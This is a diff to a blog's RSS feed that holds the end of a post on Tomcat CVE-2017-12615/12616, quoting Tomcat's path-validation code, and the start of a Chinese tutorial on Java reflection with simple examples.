+            &lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCanonicalPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;// Ignore&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;startsWith&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canonicalBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// Ensure that the file is not outside the fileBase. This should not be&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// possible for standard requests (the request is normalized early in&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// the request processing) but might be possible for some access via the&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// Servlet API (RequestDispatcher etc.) therefore these checks are&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// retained as an additional safety measure. absoluteBase has been&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// normalized so absPath needs to be normalized as well.&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;absPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;normalize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAbsolutePath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;absoluteBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;absPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// Remove the fileBase location from the start of the paths since that&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// was not part of the requested path and the remaining check only&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// applies to the request path&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;absPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;absPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;absoluteBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canonicalBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// Case sensitivity check&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// The normalized requested path should be an exact match the equivalent&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// canonical path. If it is not, possible reasons include:&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// - case differences on case insensitive file systems&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// - Windows removing a trailing ' ' or '.' from the file name&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// In all cases, a mis-match here results in the resource not being&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// found&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// absPath is normalized so canPath needs to be normalized as well&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// Can't normalize canPath earlier as canonicalBase is not normalized&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;normalize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;absPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+
+    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isInvalidWindowsFilename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// This consistently ~10 times faster than the equivalent regular&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// expression irrespective of input length.&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;charAt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'\&quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'&amp;lt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;c1&quot;&gt;// These characters are disallowed in Windows file names and&lt;/span&gt;
+                &lt;span class=&quot;c1&quot;&gt;// there are known problems for file names with these characters&lt;/span&gt;
+                &lt;span class=&quot;c1&quot;&gt;// when using File#getCanonicalPath().&lt;/span&gt;
+                &lt;span class=&quot;c1&quot;&gt;// Note: There are additional characters that are disallowed in&lt;/span&gt;
+                &lt;span class=&quot;c1&quot;&gt;//       Windows file names but these are not known to cause&lt;/span&gt;
+                &lt;span class=&quot;c1&quot;&gt;//       problems when using File#getCanonicalPath().&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// Windows does not allow file names to end in ' ' unless specific low&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// level APIs are used to create the files that bypass various checks.&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// File names that end in ' ' are known to cause problems when using&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// File#getCanonicalPath().&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;charAt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;' '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;0x04-参考&quot;&gt;0x04 参考&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;https://zhuanlan.zhihu.com/p/29649377&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Mon, 23 Oct 2017 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2017/10/23/cve-2017-12615-and-cve-2017-12616.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2017/10/23/cve-2017-12615-and-cve-2017-12616.html</guid>
+        
+        <category>Java</category>
+        
+        <category>Tomcat</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Java中的反射和动态代理</title>
+        <description>&lt;p&gt;最近一直都在学习 Java 安全相关的东西，这两个玩意可以说是经常碰到了，做个笔记。话说要是在两个月前我是万万想不到我现在整天接触的居然是 Java，一边学习 Java 一边搞 = =&lt;/p&gt;
+
+&lt;h2 id=&quot;0x00-反射机制&quot;&gt;0x00 反射机制&lt;/h2&gt;
+&lt;p&gt;利用反射机制能干的事情：&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;在运行时动态对任意的类实例化&lt;/li&gt;
+  &lt;li&gt;在运行时分析类，获取类的成员变量和方法等信息&lt;/li&gt;
+  &lt;li&gt;调用任意方法&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;0x01-获取-class-对象的三种方法&quot;&gt;0x01 获取 Class 对象的三种方法&lt;/h2&gt;
+&lt;p&gt;Class 类保存了所有对象运行时的类型标识，虚拟机在运行时根据类型信息再去选择对应的方法来执行。这里的 Class 可以理解为类类型，跟平时说的 Class 是有区别的。下面是如何去获取一个 Class 类型的实例。&lt;/p&gt;
+
+&lt;h4 id=&quot;object-类中的-getclass-方法&quot;&gt;Object 类中的 getClass() 方法&lt;/h4&gt;
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;Test&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;调用静态方法-forname&quot;&gt;调用静态方法 forName()&lt;/h4&gt;
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;className&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;java.util.Random&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;只有在 className 是类名或接口名时才能执行，不然 forName() 方法会抛出一个 checked 异常。&lt;/p&gt;
+
+&lt;h4 id=&quot;任意的-java-类型的-class-变量&quot;&gt;任意的 Java 类型的 class 变量&lt;/h4&gt;
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;用 newInstance() 方法便可以返回对应类的新实例。&lt;/p&gt;
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;Test&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;//需要转换类型才可以使用新实例，不然用 obj 去调用 Test 中的方法会出错&lt;/span&gt;
+&lt;span class=&quot;nc&quot;&gt;Test&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;obj1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;0x02-获取类信息的操作&quot;&gt;0x02 获取类信息的操作&lt;/h2&gt;
+&lt;p&gt;获取类成员变量：&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Field[] getFields()&lt;/li&gt;
+  &lt;li&gt;Field[] getDeclaredFields()
+getFields() 返回包含当前类和父类中 public 的成员变量的一个数组，getDeclaredFields() 返回包含当前类的所有成员变量的一个数组。通过 getName() 和 getType() 方法可以获取到其名字和类型。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;获取类方法：&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Method[] getMethods()&lt;/li&gt;
+  &lt;li&gt;Method[] getDeclareMethods()
+效果跟上面的类似，只是 getDeclareMethods() 还能得到接口的全部方法。通过 getName() 和 getReturnType() 方法可以获取到其名字和返回类型。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;也可以通过其名字来获取到对应的变量，方法名就是上面那些方法名去掉 s 后传名字作为参数。通过 get() 和 set() 方法可以获取类成员变量的值或者是给类成员变量设置一个值，需要有访问权限，不过也可以通过 setAccessible() 方法来覆盖访问控制。下面一个例子：&lt;/p&gt;
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.lang.reflect.Field&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/**
+ * Created by k1n9 on 2017/9/12.
+ */&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ReflectionTest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Rtest&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;Field&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;secret&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;whoami&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
